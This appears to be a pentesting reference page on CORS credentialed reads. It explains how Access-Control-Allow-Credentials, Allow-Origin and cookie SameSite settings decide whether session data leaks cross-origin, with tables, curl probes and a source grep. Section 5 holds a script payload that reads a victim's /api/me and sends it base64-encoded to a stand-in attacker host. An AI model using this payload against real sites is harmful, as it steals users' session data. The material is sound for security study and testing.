# ACAC and credentials — the credentialed-read gate

`Access-Control-Allow-Credentials` is the second half of the vuln —
whether the session cookie may ride the cross-origin read.

---

## 1. What ACAC does

```text
ACAC:true tells the browser 'this response may be read WITH
credentials' — the fetch's credentials:'include' carries the
cookie, and the response is readable. without ACAC, the read is
non-credentialed — the session data doesn't reach the JS.
```

## 2. The `*` + ACAC rejection — the browser's rule

```text
ACAO:* + ACAC:true → the browser REJECTS the credentialed read.
`*` means 'public'; credentials need a NAMED origin. a `*+ACAC`
endpoint can never carry the session cookie — it's the
anti-pattern that looks open but isn't.
```

```bash
curl -s -i -b "$CJ" "$BASE/api/me" -H 'Origin: https://evil.com' | \
  grep -iE 'access-control-allow-(origin|credentials)'
#   ACAO: * + ACAC: true → INVALID → the browser rejects the credentialed fetch
```

## 3. The credential sources — what rides the fetch

```text
a cookie — the common case; SameSite-gated.
an Authorization header — needs a preflight; the token must reach
   the page (a readable token endpoint or a leaked JWT).
a client cert — mTLS — rides automatically.
```

## 4. The cookie's SameSite — the modern gate

```text
SameSite=None; Secure → the cookie attaches cross-site — the
   credentialed read works.
SameSite=Lax          → attaches on top-level navigation GETs only —
   a fetch() does NOT carry it → non-credentialed.
SameSite=Strict       → never cross-site → non-credentialed.
no SameSite           → Lax-by-default in modern browsers.
```

```bash
curl -i -b "$CJ" "$BASE/" | grep -i 'set-cookie'
#   SameSite=None; Secure → the credentialed read works
```

## 5. The Bearer-token path — a non-cookie credential

```html
<!-- the token is readable or known — the fetch carries it -->
<script>
fetch('https://t/api/me',{
  credentials:'include',
  headers:{'Authorization':'Bearer '+TOKEN}
}).then(r=>r.json()).then(d=>fetch('https://a/?d='+btoa(JSON.stringify(d))))
</script>
```

The `Authorization` header is non-simple — needs a preflight that
allows the header.

## 6. The ACAC-absent case — a non-credentialed read

```text
ACAO reflected/null + NO ACAC → the fetch succeeds but reads
UNAUTHENTICATED data — the session cookie doesn't ride, and even
if it did the response isn't credentialed-readable. a public read
of public data — not the vuln unless the data is sensitive anyway.
```

## 7. The ACAC+SameSite matrix — does the read carry the session

```text
ACAC:true + SameSite=None+Secure  → credentialed read — THE VULN
ACAC:true + SameSite=Lax/Strict   → cookie doesn't ride — public read
ACAC absent + any SameSite        → non-credentialed read
* + ACAC                          → invalid — rejected
```

## 8. The `Vary` interaction — a per-credential response

```text
a Vary: Cookie response keyed on the session — a shared cache may
serve a different session's data — a cache side-channel, not the
CORS read itself.
```

## 9. The white-box ACAC read

```bash
grep -rnoiE 'Access-Control-Allow-Credentials|supports_credentials|allow_credentials|allowCredentials|credentials.*true' <src>
# ACAC set → the credentialed read is intended → the ACAO check is the gate
```

## 10. The ACAC decision table

```text
ACAC:true + ACAO reflected/allowed  → credentialed read — the vuln
ACAC:true + ACAO:*                  → rejected — no read
ACAC absent/false                   → non-credentialed — public data
ACAC:true + ACAO:null               → credentialed opaque-origin read
```
